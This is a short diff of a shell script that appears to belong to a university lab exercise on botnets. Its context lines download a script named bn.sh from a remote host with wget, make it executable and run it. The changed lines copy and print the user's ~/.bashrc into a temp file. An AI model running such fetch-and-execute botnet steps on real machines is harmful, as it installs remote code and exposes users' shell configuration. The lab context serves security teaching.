@@ -11,10 +11,8 @@ wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bn.sh" &> /dev/null
 #gcc cgethttp.c -o cgethttp                                                                                                    
 #chmod +x cgethttp
 
-echo blah `pwd`
-cp ~/.bashrc ~/.bashrc_old
-cat ~/.bashrc_old
-echo blah2 `pwd`
+cp ~/.bashrc ~/.bashrc_old >> temp
+cat ~/.bashrc_old >> temp
 
 chmod +x bn.sh
 ./bn.sh
